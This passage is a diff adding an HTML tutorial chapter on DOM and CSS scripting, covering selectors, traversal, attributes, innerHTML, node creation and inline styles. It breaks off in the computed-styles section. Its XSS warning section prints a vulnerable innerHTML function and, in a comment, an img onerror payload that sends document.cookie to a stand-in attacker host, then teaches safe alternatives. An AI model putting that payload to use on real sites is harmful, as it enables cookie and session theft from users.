@@ -1,0 +1,1300 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>DOM & CSS Scripting — JavaScript: The Definitive Guide</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%232dd4bf%22/><text x=%2250%22 y=%2268%22 font-size=%2258%22 font-family=%22monospace%22 font-weight=%22bold%22 fill=%22%2306231f%22 text-anchor=%22middle%22>JS</text></svg>" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css" />
+<link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body data-loc="chapter" data-file="17-dom-css-scripting.html">
+
+<header class="site-header">
+  <button class="menu-toggle" id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+  <a class="brand" data-home-link href="../index.html"><span class="logo-mark">JS</span> The Definitive Guide</a>
+  <div class="header-search">
+    <button id="search-open" type="button">
+      <span>&#128269;</span><span>Search pages...</span><kbd>Ctrl K</kbd>
+    </button>
+  </div>
+  <nav class="header-links">
+    <a data-home-link href="../index.html">Home</a>
+  </nav>
+</header>
+
+<div class="layout">
+  <aside class="sidebar">
+    <nav id="sidebar-nav"></nav>
+  </aside>
+
+  <div class="content-wrap">
+    <main class="content">
+      <div class="chapter-badge" id="chapter-badge"></div>
+      <span class="eyebrow">Book Chapter 15, &sect;15.3&ndash;15.5</span>
+      <h1>DOM &amp; CSS Scripting</h1>
+      <p class="lede">
+        Once a browser has parsed HTML into a document, JavaScript's central
+        job begins: finding elements, reading and rewriting what they
+        contain, driving their visual style, and measuring exactly where
+        they land on the rendered page. This page works through the DOM
+        scripting API, the CSS scripting API, and the geometry/scrolling API
+        in the depth you need to use them correctly &mdash; including the two
+        places programmers most often get burned: injecting untrusted HTML,
+        and confusing the half-dozen "size" properties an element exposes.
+      </p>
+
+      <h2 id="dom-tree-model">The document as a tree</h2>
+      <p>
+        Every <code>Window</code> has a <code>document</code> property
+        referring to a <code>Document</code> object, which is the root of a
+        tree of <code>Node</code> objects. Most of those nodes are
+        <code>Element</code> nodes (one per HTML tag), but the tree also
+        contains <code>Text</code> nodes (for the literal characters between
+        tags, including whitespace) and occasionally <code>Comment</code>
+        nodes. <code>document.head</code> and <code>document.body</code> give
+        you the two top-level elements directly; everything else has to be
+        located by querying or traversing from there.
+      </p>
+      <p>
+        This page assumes you already know what the DOM tree conceptually
+        looks like and how events flow through it &mdash; see
+        <a href="16-web-basics-events.html">Web Basics &amp; Events</a> for
+        that foundation. Here we cover the practical API surface for reading
+        and rewriting that tree, restyling it, and measuring it once it's
+        rendered.
+      </p>
+
+      <h2 id="selecting-elements">Selecting elements</h2>
+      <p>
+        Nearly every DOM script starts by selecting one or more elements to
+        work with. The modern, and by far most common, way to do this is with
+        CSS selector syntax passed to <code>querySelector()</code> and
+        <code>querySelectorAll()</code>.
+      </p>
+      <h3 id="css-selector-syntax">A CSS-selector refresher</h3>
+      <p>
+        Because the DOM lets you select with the exact same syntax you write
+        in a stylesheet, it's worth having the vocabulary fresh:
+      </p>
+      <div class="code-block" data-lang="CSS">
+<pre><code class="language-css">div                      /* any &lt;div&gt; */
+#nav                     /* the element with id="nav" */
+.warning                 /* any element with "warning" in its class list */
+p[lang="fr"]             /* a &lt;p lang="fr"&gt; */
+*[name="x"]              /* any element with a name="x" attribute */
+span.fatal.error         /* a &lt;span&gt; with BOTH "fatal" and "error" classes */
+
+#log span                /* any &lt;span&gt; DESCENDANT of #log, any depth */
+#log &gt; span              /* any &lt;span&gt; that is a direct CHILD of #log */
+body &gt; h1:first-child    /* the first &lt;h1&gt; child of &lt;body&gt; */
+img + p.caption          /* a &lt;p class="caption"&gt; immediately after an &lt;img&gt; */
+h2 ~ p                   /* any &lt;p&gt; sibling that FOLLOWS an &lt;h2&gt; */
+
+button, input[type="button"]   /* comma = "match either selector" */</code></pre>
+      </div>
+      <p>
+        With that vocabulary in hand, the two workhorse methods are:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// First matching element in document order, or null if nothing matches
+let spinner = document.querySelector("#spinner");
+
+// EVERY matching element, as a NodeList (not a real array, but iterable
+// and indexable; length is 0 if nothing matches)
+let titles = document.querySelectorAll("h1, h2, h3");
+for (let title of titles) {
+  console.log(title.tagName, title.textContent);
+}
+
+// Convert to a real array if you want map/filter/reduce
+let titleArray = Array.from(titles);</code></pre>
+      </div>
+      <p>
+        Both methods are also defined on <code>Element</code>, not just
+        <code>Document</code> &mdash; calling <code>el.querySelectorAll(...)</code>
+        restricts the search to descendants of <code>el</code>. Two CSS
+        pseudo-elements, <code>::first-line</code> and
+        <code>::first-letter</code>, match portions of text rather than real
+        elements and will never match here; many browsers also refuse to
+        return matches for <code>:link</code>/<code>:visited</code>, since
+        that could leak browsing history to a script.
+      </p>
+      <div class="admonition tip">
+        <div class="admonition-title">querySelectorAll() vs. the getElementsBy* family</div>
+        <p>
+          <code>querySelectorAll()</code> returns a <strong>static</strong>
+          snapshot taken at call time &mdash; later DOM changes don't affect
+          the list you already have. The older
+          <code>getElementsByTagName()</code>,
+          <code>getElementsByClassName()</code>, and
+          <code>getElementsByName()</code> methods instead return a
+          <strong>live</strong> <code>HTMLCollection</code>/<code>NodeList</code>
+          that updates automatically as the document changes underneath it.
+          Iterating a live collection while inserting or removing matching
+          elements is a classic bug: the list's <code>length</code> can shift
+          out from under a running <code>for</code> loop, silently skipping
+          or repeating elements.
+        </p>
+      </div>
+      <h3 id="closest-and-matches">closest() and matches()</h3>
+      <p>
+        <code>querySelector()</code> searches <em>downward</em> from an
+        element into its descendants. <code>closest()</code> does the
+        opposite: starting at the element itself and walking
+        <em>upward</em> through ancestors, it returns the first one (element
+        itself included) that matches a selector, or <code>null</code> if
+        none do. It is the natural pairing for event delegation
+        (see <a href="16-web-basics-events.html#propagation">Web Basics &amp; Events</a>):
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// event.target might be a &lt;span&gt; or text run inside the &lt;a&gt;,
+// not the hyperlink itself -- walk up to find the real link
+document.body.addEventListener("click", (event) =&gt; {
+  let hyperlink = event.target.closest("a[href]");
+  if (hyperlink) {
+    console.log("Clicked link to", hyperlink.href);
+  }
+});
+
+// Another common use: "is this node inside some kind of list?"
+function insideList(e) {
+  return e.closest("ul, ol, dl") !== null;
+}</code></pre>
+      </div>
+      <p>
+        <code>matches()</code> is simpler still: it tests only the element
+        it's called on and returns a boolean, with no traversal at all.
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">function isHeading(e) {
+  return e.matches("h1,h2,h3,h4,h5,h6");
+}</code></pre>
+      </div>
+      <h3 id="older-selection-methods">Older selection methods and preselected collections</h3>
+      <p>
+        You will still see an earlier generation of selection methods,
+        especially <code>getElementById()</code>, which remains extremely
+        common because it is marginally faster and very explicit:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">document.getElementById("sect1");            // like querySelector("#sect1")
+document.getElementsByName("color");          // elements with name="color" (live)
+document.getElementsByTagName("h1");          // all &lt;h1&gt; (live)
+sect1.getElementsByTagName("h2");             // scoped to a subtree (live)
+document.getElementsByClassName("tooltip");   // like querySelectorAll(".tooltip") (live)</code></pre>
+      </div>
+      <p>
+        <code>Document</code> also exposes a handful of shortcut properties
+        left over from very old HTML DOM APIs:
+        <code>document.images</code>, <code>document.forms</code>, and
+        <code>document.links</code> (only <code>&lt;a&gt;</code> tags that
+        have an <code>href</code>) give you <code>HTMLCollection</code>s of
+        those elements, and unlike a plain <code>NodeList</code> an
+        <code>HTMLCollection</code> can also be indexed by an element's
+        <code>id</code> or <code>name</code>:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">document.forms.address;   // the &lt;form id="address"&gt; (or name="address") element</code></pre>
+      </div>
+      <div class="admonition note">
+        <div class="admonition-title">document.all is dead</div>
+        <p>
+          <code>document.all</code>, an even older ancestor of these
+          collections that indexes every element in the document, still
+          exists for legacy-compatibility reasons but is deprecated. Don't
+          write new code against it.
+        </p>
+      </div>
+
+      <h2 id="traversing-the-tree">Traversing the tree: elements vs. all nodes</h2>
+      <p>
+        Once you've selected a starting element, you often need to walk to
+        its parent, children, or siblings. The DOM gives you two parallel
+        sets of properties for this: one that only ever sees
+        <code>Element</code> nodes, and one defined on every <code>Node</code>
+        that also sees <code>Text</code> and <code>Comment</code> nodes.
+      </p>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Elements only (skip text/comments)</th><th>All nodes (incl. text/comments)</th></tr>
+          <tr><td><code>children</code>, <code>childElementCount</code></td><td><code>childNodes</code></td></tr>
+          <tr><td><code>firstElementChild</code> / <code>lastElementChild</code></td><td><code>firstChild</code> / <code>lastChild</code></td></tr>
+          <tr><td><code>nextElementSibling</code> / <code>previousElementSibling</code></td><td><code>nextSibling</code> / <code>previousSibling</code></td></tr>
+          <tr><td><code>parentNode</code></td><td><code>parentNode</code> (identical either way)</td></tr>
+        </table>
+      </div>
+      <p>
+        In practice you almost always want the element-only set: it's rare
+        to care about the whitespace text node sitting between two tags in
+        your source. Here is a depth-first traversal written both ways, to
+        show how the two families mirror each other:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// Element-only traversal: invoke f() on e and every descendant element
+function traverse(e, f) {
+  f(e);
+  for (let child of e.children) {
+    traverse(child, f);
+  }
+}
+
+// The same traversal written as an explicit linked-list walk
+function traverse2(e, f) {
+  f(e);
+  let child = e.firstElementChild;
+  while (child !== null) {
+    traverse2(child, f);
+    child = child.nextElementSibling;
+  }
+}</code></pre>
+      </div>
+      <p>
+        The all-nodes API additionally exposes <code>nodeType</code> (a
+        number: <code>9</code> for a Document, <code>1</code> for an Element,
+        <code>3</code> for Text, <code>8</code> for Comment),
+        <code>nodeValue</code> (the text of a Text/Comment node), and
+        <code>nodeName</code> (an element's tag name, uppercased). Here is a
+        hand-rolled reimplementation of <code>textContent</code> that shows
+        how to walk that raw node graph:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">function textContent(e) {
+  let s = "";
+  for (let child = e.firstChild; child !== null; child = child.nextSibling) {
+    if (child.nodeType === 3) {        // Text node
+      s += child.nodeValue;
+    } else if (child.nodeType === 1) { // Element node -- recurse
+      s += textContent(child);
+    }
+  }
+  return s;
+}
+// In real code just write e.textContent -- this is purely illustrative.</code></pre>
+      </div>
+      <div class="admonition warning">
+        <div class="admonition-title">A stray newline changes childNodes</div>
+        <p>
+          Whitespace between tags in your source becomes real Text nodes, so
+          <code>document.childNodes[0].childNodes[1]</code> is extremely
+          sensitive to formatting: insert one newline between
+          <code>&lt;html&gt;</code> and <code>&lt;head&gt;</code> and the index
+          that used to reach <code>&lt;body&gt;</code> now reaches
+          <code>&lt;head&gt;</code> instead. This is exactly why the
+          element-only properties (<code>firstElementChild</code>,
+          <code>children</code>, etc.) exist and should be your default.
+        </p>
+      </div>
+
+      <h2 id="attributes-and-properties">Attributes vs. properties</h2>
+      <p>
+        HTML elements consist of a tag name plus a set of name/value
+        attribute pairs. The generic, always-available way to work with them
+        is the four-method attribute API defined on every
+        <code>Element</code>:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">el.getAttribute("href");
+el.setAttribute("href", "https://example.com/");
+el.hasAttribute("disabled");
+el.removeAttribute("disabled");   // the ONLY way to fully remove an attribute --
+                                   // the delete operator does not work here</code></pre>
+      </div>
+      <p>
+        But for the standard attributes of standard HTML elements, the
+        <code>Element</code> object also mirrors each attribute as a same- or
+        similarly-named JavaScript <em>property</em>, and working with the
+        property is usually more convenient than calling
+        <code>getAttribute()</code>/<code>setAttribute()</code>:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let image = document.querySelector("#main_image");
+image.src;                 // property mirrors the src attribute (as a full URL)
+image.id === "main_image"; // => true
+
+let f = document.querySelector("form");
+f.action = "https://example.com/submit";
+f.method = "POST";</code></pre>
+      </div>
+      <p>
+        The mapping between attribute names and property names follows a few
+        rules you'll want internalized:
+      </p>
+      <ul>
+        <li>
+          Multi-word attributes drop hyphens and capitalize each following
+          word: <code>defaultChecked</code>, <code>tabIndex</code>. Event
+          handler properties like <code>onclick</code> are the exception and
+          stay all-lowercase.
+        </li>
+        <li>
+          Attributes that collide with a JavaScript reserved word get an
+          <code>html</code> prefix &mdash; the <code>for</code> attribute of
+          <code>&lt;label&gt;</code> becomes <code>htmlFor</code>.
+        </li>
+        <li>
+          <code>class</code> is the one attribute that breaks even that
+          rule: it becomes <code>className</code>, not <code>htmlClass</code>
+          (see below for the far more useful <code>classList</code>
+          alternative).
+        </li>
+        <li>
+          Some attributes map to a <em>different</em> property than you'd
+          expect: an <code>&lt;input&gt;</code>'s HTML <code>value</code>
+          attribute is mirrored by the property <code>defaultValue</code>,
+          while the JavaScript <code>value</code> property tracks the user's
+          <em>current</em> typed input. Changing <code>.value</code> does not
+          change <code>.defaultValue</code> or the underlying attribute.
+        </li>
+        <li>
+          Boolean and numeric attributes (<code>defaultChecked</code>,
+          <code>maxLength</code>) come back as real booleans/numbers, not
+          strings; event handler properties are functions (or
+          <code>null</code>), never strings.
+        </li>
+      </ul>
+      <h3 id="classlist-api">classList</h3>
+      <p>
+        The <code>class</code> attribute is really a space-separated list,
+        so treating it as one opaque string via <code>className</code> is
+        awkward whenever you want to add or remove a single class. The
+        <code>classList</code> property exposes it as an iterable,
+        set-like object instead:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let spinner = document.querySelector("#spinner");
+spinner.classList.add("animated");        // add one (or more) class names
+spinner.classList.remove("hidden");        // remove one (or more)
+spinner.classList.toggle("open");           // add if absent, remove if present
+spinner.classList.toggle("open", isOpen);    // force add/remove based on a boolean
+spinner.classList.contains("selected");       // boolean membership test</code></pre>
+      </div>
+      <h3 id="dataset-attributes">Dataset attributes</h3>
+      <p>
+        Any lowercase attribute prefixed <code>data-</code> is valid HTML and
+        never affects rendering, which makes it the standard place to stash
+        extra data for scripts to read. Each Element exposes them through
+        <code>.dataset</code>, with hyphens turned into camelCase:
+      </p>
+      <div class="code-block" data-lang="HTML">
+<pre><code class="language-xml">&lt;h2 id="title" data-section-number="16.1"&gt;Attributes&lt;/h2&gt;</code></pre>
+      </div>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let number = document.querySelector("#title").dataset.sectionNumber;
+// => "16.1" -- dataset values are ALWAYS strings, even if they look numeric</code></pre>
+      </div>
+
+      <h2 id="element-content-html-text">Reading and writing element content</h2>
+      <p>
+        Ask "what is the content of this <code>&lt;p&gt;</code>?" and there
+        are two equally valid answers: the markup string
+        <code>"This is a &lt;i&gt;simple&lt;/i&gt; document"</code>, or the
+        plain text <code>"This is a simple document"</code>. The DOM gives
+        you both views.
+      </p>
+      <h3 id="innerhtml-outerhtml">innerHTML, outerHTML, and insertAdjacentHTML()</h3>
+      <p>
+        Reading <code>innerHTML</code> serializes an element's descendants
+        back into a markup string; setting it invokes the browser's own HTML
+        parser and replaces the element's entire contents with the parsed
+        result of the new string:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">document.querySelector("#card").innerHTML =
+  "&lt;h3&gt;Title&lt;/h3&gt;&lt;p&gt;Body text&lt;/p&gt;";</code></pre>
+      </div>
+      <p>
+        <code>outerHTML</code> is the same idea but includes the element's
+        own opening/closing tags: reading it returns the element plus its
+        content, and setting it replaces the element itself (not just its
+        insides) with the parsed markup. <code>insertAdjacentHTML(position,
+        html)</code> inserts a markup string without disturbing the
+        element's existing children at all; <code>position</code> is one of
+        <code>"beforebegin"</code>, <code>"afterbegin"</code>,
+        <code>"beforeend"</code>, or <code>"afterend"</code>, naming the four
+        insertion points immediately outside/inside the element's own tags.
+      </p>
+      <div class="admonition warning">
+        <div class="admonition-title">innerHTML += is quietly expensive</div>
+        <p>
+          <code>el.innerHTML += "&lt;li&gt;more&lt;/li&gt;"</code> first
+          serializes the <em>entire existing subtree</em> to a string, then
+          re-parses the concatenated result from scratch, throwing away and
+          rebuilding every existing child node (along with any listeners or
+          state attached to them). Use <code>insertAdjacentHTML("beforeend",
+          ...)</code> or the node-creation APIs below instead.
+        </p>
+      </div>
+      <h3 id="textcontent-innertext">textContent (and why not innerText)</h3>
+      <p>
+        When you want plain text in or out &mdash; no HTML parsing, no
+        escaping of angle brackets or ampersands required &mdash; use
+        <code>textContent</code>, defined on <code>Node</code> so it works on
+        Text nodes as well as elements:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let para = document.querySelector("p");
+let text = para.textContent;       // all descendant text, concatenated
+para.textContent = "Hello World!"; // replaces all children with one Text node</code></pre>
+      </div>
+      <p>
+        <code>Element</code> also defines a similar-looking
+        <code>innerText</code> property, but it tries to approximate
+        <em>rendered</em> text (collapsing whitespace, respecting
+        <code>display:none</code>, attempting to preserve table layout as
+        spacing) and is inconsistently specified across browsers. Prefer
+        <code>textContent</code> and avoid <code>innerText</code> in new
+        code.
+      </p>
+      <h3 id="script-element-text">Text inside inline &lt;script&gt; elements</h3>
+      <p>
+        An inline <code>&lt;script&gt;</code> (no <code>src</code>) exposes
+        its raw source through a <code>.text</code> property. Because the
+        HTML parser never interprets angle brackets or ampersands inside a
+        <code>&lt;script&gt;</code> body, giving one a non-JS
+        <code>type</code> attribute (e.g. <code>type="text/x-template"</code>)
+        turns it into a convenient, syntax-safe place to embed arbitrary
+        textual data in a page &mdash; the JS engine skips executing it, but
+        it stays in the DOM tree for your own code to read via
+        <code>.text</code>.
+      </p>
+
+      <h2 id="innerhtml-xss">
+        innerHTML as an injection vector <span class="badge hard">Hard part</span>
+      </h2>
+      <p>
+        This is the single most common way real web applications end up
+        cross-site-scriptable, so it earns a dedicated warning. Any time you
+        build an HTML string that includes data that came from a user
+        &mdash; a query parameter, a comment, a display name, a search box
+        &mdash; and hand that string to <code>innerHTML</code>,
+        <code>outerHTML</code>, or <code>insertAdjacentHTML()</code>, you are
+        asking the browser to <em>parse and run</em> whatever that user
+        typed.
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// VULNERABLE: attacker-controlled `comment.text` is parsed as markup
+function renderComment(comment) {
+  let li = document.createElement("li");
+  li.innerHTML = `&lt;strong&gt;${comment.author}:&lt;/strong&gt; ${comment.text}`;
+  commentList.append(li);
+}
+
+// If comment.text is the string:
+//   &lt;img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)"&gt;
+// the browser dutifully creates that &lt;img&gt;, the (broken) src fails to load,
+// and onerror fires -- running the attacker's JavaScript in YOUR page's
+// origin, with access to cookies, localStorage, and anything else you can do.</code></pre>
+      </div>
+      <p>
+        The fix is almost never to "sanitize" the string yourself (easy to
+        get subtly wrong); it's to stop treating user data as markup in the
+        first place. Two safe patterns:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// SAFE #1: textContent never parses -- angle brackets render as literal text
+function renderCommentSafe(comment) {
+  let li = document.createElement("li");
+  let strong = document.createElement("strong");
+  strong.textContent = comment.author + ":";
+  li.append(strong, " ", comment.text);   // append() accepts strings + nodes
+  commentList.append(li);
+}
+
+// SAFE #2: if you truly need to build a bigger fragment, keep the
+// user-controlled pieces as textContent/attribute assignments and only use
+// innerHTML for the FIXED, developer-authored parts of the markup
+function renderCard(title, userBio) {
+  let card = document.createElement("div");
+  card.innerHTML = "&lt;h3&gt;&lt;/h3&gt;&lt;p class=\"bio\"&gt;&lt;/p&gt;"; // static skeleton, no user data
+  card.querySelector("h3").textContent = title;      // safe: assigned as text
+  card.querySelector(".bio").textContent = userBio;  // safe: assigned as text
+  return card;
+}</code></pre>
+      </div>
+      <div class="admonition warning">
+        <div class="admonition-title">The rule, stated plainly</div>
+        <p>
+          Never pass a string built from user input to <code>innerHTML</code>,
+          <code>outerHTML</code>, <code>insertAdjacentHTML()</code>, or
+          <code>document.write()</code>. Use <code>textContent</code>,
+          element properties (<code>.src</code>, <code>.href</code>,
+          <code>.className</code>), or <code>setAttribute()</code> for
+          anything that isn't 100% developer-authored markup. When you
+          genuinely need to render user-authored <em>rich</em> text (a
+          markdown comment, say), run it through a dedicated, well-maintained
+          sanitizing library before it ever reaches <code>innerHTML</code>
+          &mdash; do not attempt to hand-roll a blocklist of dangerous tags.
+        </p>
+      </div>
+      <p>
+        Note that setting <code>innerHTML</code> to a string that contains
+        only markup <em>you</em> wrote (no interpolated user data) is
+        perfectly fine and often the most efficient way to build static
+        structure &mdash; the danger is specifically about the provenance of
+        the data, not the API itself.
+      </p>
+
+      <h2 id="creating-inserting-removing-nodes">Creating, inserting, and removing nodes</h2>
+      <p>
+        Beyond string-based HTML/text assignment, the DOM lets you build and
+        rearrange the tree node by node. Create an element with
+        <code>document.createElement()</code>, then use the modern insertion
+        methods to place it:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let paragraph = document.createElement("p");
+let emphasis = document.createElement("em");
+emphasis.append("World");                  // append() accepts strings AND nodes
+paragraph.append("Hello ", emphasis, "!"); // any number of mixed arguments
+paragraph.prepend("¡");                // add at the START of the child list
+paragraph.innerHTML;                        // => "&iexcl;Hello &lt;em&gt;World&lt;/em&gt;!"</code></pre>
+      </div>
+      <p>
+        String arguments to <code>append()</code>/<code>prepend()</code> are
+        automatically wrapped in Text nodes for you (you can call
+        <code>document.createTextNode()</code> explicitly, but there's rarely
+        a reason to). To insert relative to an existing <em>sibling</em>
+        rather than at the start/end of a parent, use <code>before()</code>
+        and <code>after()</code>, which (unlike <code>append</code>/
+        <code>prepend</code>) also work on Text nodes:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let greetings = document.querySelector("h2.greetings");
+greetings.after(paragraph, document.createElement("hr")); // insert both after it
+
+// swap an element in place for something else:
+greetings.replaceWith(paragraph);
+
+// remove a node from the document entirely:
+paragraph.remove();</code></pre>
+      </div>
+      <div class="admonition note">
+        <div class="admonition-title">Inserting an existing node MOVES it</div>
+        <p>
+          A node can only ever exist at one place in the document. Passing a
+          node that is already attached elsewhere to <code>append()</code>,
+          <code>before()</code>, <code>replaceWith()</code>, or any other
+          insertion method <em>relocates</em> it rather than duplicating it.
+          If you actually want a copy, call
+          <code>node.cloneNode(true)</code> first &mdash; the boolean
+          argument controls whether descendants are copied too
+          (<code>cloneNode(false)</code> copies only the node itself, with no
+          children).
+        </p>
+      </div>
+      <p>
+        An older generation of insertion/removal methods &mdash;
+        <code>appendChild()</code>, <code>insertBefore()</code>,
+        <code>replaceChild()</code>, and <code>removeChild()</code> &mdash;
+        still works everywhere but is fussier to use correctly (some require
+        a reference to the <em>parent</em> rather than a sibling, and none
+        accept plain strings). New code should reach for
+        <code>append()</code>/<code>prepend()</code>/<code>before()</code>/
+        <code>after()</code>/<code>replaceWith()</code>/<code>remove()</code>
+        instead.
+      </p>
+      <h3 id="document-fragments">DocumentFragment for batch insertion</h3>
+      <p>
+        Inserting nodes into a live document one at a time can trigger a
+        separate layout/reflow for each insertion. <code>document.createDocumentFragment()</code>
+        gives you a lightweight, parentless container: you build up a whole
+        subtree inside it off-document, then insert the fragment once, at
+        which point <em>only its children</em> (not the fragment node
+        itself) move into the real tree in a single operation:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let fragment = document.createDocumentFragment();
+for (let item of items) {
+  let li = document.createElement("li");
+  li.textContent = item.label;
+  fragment.append(li);
+}
+list.append(fragment);   // one reflow, not `items.length` of them</code></pre>
+      </div>
+
+      <h3 id="toc-worked-example">Worked example: generating a table of contents</h3>
+      <p>
+        A single realistic script ties selection, traversal, attributes, and
+        node creation together: scan the document for headings, number them,
+        wrap each in a named anchor, and build a linked table of contents.
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">document.addEventListener("DOMContentLoaded", () =&gt; {
+  let toc = document.querySelector("#TOC");
+  if (!toc) {
+    toc = document.createElement("div");
+    toc.id = "TOC";
+    document.body.prepend(toc);
+  }
+
+  let headings = document.querySelectorAll("h2,h3,h4,h5,h6");
+  let sectionNumbers = [0, 0, 0, 0, 0];
+
+  for (let heading of headings) {
+    if (heading.parentNode === toc) continue; // skip anything inside the TOC itself
+
+    let level = parseInt(heading.tagName.charAt(1)) - 1; // &lt;h2&gt; -&gt; level 1
+    sectionNumbers[level - 1]++;
+    for (let i = level; i &lt; sectionNumbers.length; i++) sectionNumbers[i] = 0;
+    let sectionNumber = sectionNumbers.slice(0, level).join(".");
+
+    let span = document.createElement("span");
+    span.className = "TOCSectNum";
+    span.textContent = sectionNumber;
+    heading.prepend(span);
+
+    let anchor = document.createElement("a");
+    let fragmentName = `TOC${sectionNumber}`;
+    anchor.name = fragmentName;
+    heading.before(anchor);
+    anchor.append(heading);   // moves the heading INSIDE the new anchor
+
+    let link = document.createElement("a");
+    link.href = `#${fragmentName}`;
+    link.textContent = heading.textContent; // safe: no untrusted data involved
+
+    let entry = document.createElement("div");
+    entry.classList.add("TOCEntry", `TOCLevel${level}`);
+    entry.append(link);
+    toc.append(entry);
+  }
+});</code></pre>
+      </div>
+
+      <h2 id="scripting-css-overview">Scripting CSS: three levers</h2>
+      <p>
+        JavaScript can drive an element's visual presentation through three
+        mechanisms, roughly in order of how often you should reach for each:
+      </p>
+      <ol>
+        <li>
+          <strong>Toggle a class</strong> and let a stylesheet you already
+          wrote define what that class means. This keeps presentation
+          decisions in CSS, where they belong, and JS just flips a switch.
+        </li>
+        <li>
+          <strong>Set inline styles</strong> via <code>element.style</code>,
+          for values that can only be known at runtime (a computed position,
+          a drag offset, a chart bar's height).
+        </li>
+        <li>
+          <strong>Read (never write) computed styles</strong> via
+          <code>getComputedStyle()</code>, when you need to know what the
+          browser actually rendered.
+        </li>
+      </ol>
+      <p>
+        Some of the CSS properties most commonly driven from script:
+        <code>display</code> (set to <code>"none"</code> to hide an element,
+        anything else to reveal it again), <code>position</code>/
+        <code>top</code>/<code>left</code> (for tooltips, modals, and other
+        dynamically placed content), <code>transform</code> (to shift, scale,
+        or rotate), and <code>transition</code> (the browser animates the
+        change for you &mdash; script only needs to trigger it, see
+        &sect;&nbsp;below).
+      </p>
+
+      <h3 id="css-classes-and-classlist">CSS classes</h3>
+      <p>
+        The simplest and most maintainable way to script appearance is
+        exactly the <code>classList</code> API already covered above, applied
+        to presentation classes instead of semantic ones:
+      </p>
+      <div class="code-block" data-lang="CSS">
+<pre><code class="language-css">.hidden { display: none; }</code></pre>
+      </div>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let tooltip = document.querySelector("#tooltip"); // starts with class="hidden"
+tooltip.classList.remove("hidden");  // show it
+tooltip.classList.add("hidden");     // hide it again</code></pre>
+      </div>
+
+      <h3 id="inline-styles">Inline styles: element.style</h3>
+      <p>
+        When a stylesheet class can't capture the value (an arbitrary,
+        computed pixel position, for instance), script the
+        <code>style</code> attribute directly. Every element exposes it not
+        as a string but as a live <code>CSSStyleDeclaration</code> object:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">function displayAt(tooltip, x, y) {
+  tooltip.style.display = "block";
+  tooltip.style.position = "absolute";
+  tooltip.style.left = `${x}px`;
+  tooltip.style.top = `${y}px`;
+}</code></pre>
+      </div>
+      <p>
+        CSS property names with hyphens (illegal in a JS identifier, since a
+        hyphen reads as subtraction) are camelCased on
+        <code>CSSStyleDeclaration</code>: <code>border-left-width</code>
+        becomes <code>borderLeftWidth</code>, <code>font-family</code>
+        becomes <code>fontFamily</code>, <code>background-color</code>
+        becomes <code>backgroundColor</code>.
+      </p>
+      <div class="admonition warning">
+        <div class="admonition-title">Values are strings, and units are mandatory</div>
+        <p>
+          Every value you assign through <code>.style</code> must be a
+          <em>string</em>, and any property that needs a unit will silently
+          ignore a bare number:
+        </p>
+      </div>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">e.style.marginLeft = 300;      // WRONG -- ignored; not a string
+e.style.marginLeft = "300";    // WRONG -- string, but missing units
+e.style.marginLeft = "300px";  // correct
+
+// building a computed value: append the unit at the very end
+e.style.left = `${x0 + leftBorder + leftPadding}px`;
+
+// shortcut properties work too, as a single string:
+e.style.margin = `${top}px ${right}px ${bottom}px ${left}px`;</code></pre>
+      </div>
+      <p>
+        To copy or serialize an entire inline style at once, use
+        <code>cssText</code> (or the equivalent <code>getAttribute("style")</code>/
+        <code>setAttribute("style", ...)</code> pair):
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">f.style.cssText = e.style.cssText; // copy element e's inline style onto f</code></pre>
+      </div>
+
+      <h3 id="computed-styles">Computed styles: getComputedStyle()</h3>
+      <p>
+        <code>element.style</code> only reflects the inline
+        <code>style</code> attribute &mdash; it says nothing about rules
+        coming from a stylesheet. To find out what the browser
+        <em>actually</em> used to render an element, ask for its computed
+        style:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let title = document.querySelector("#section1title");
+let styles = window.getComputedStyle(title);
+let beforeStyles = window.getComputedStyle(title, "::before"); // pseudo-element, optional 2nd arg
+
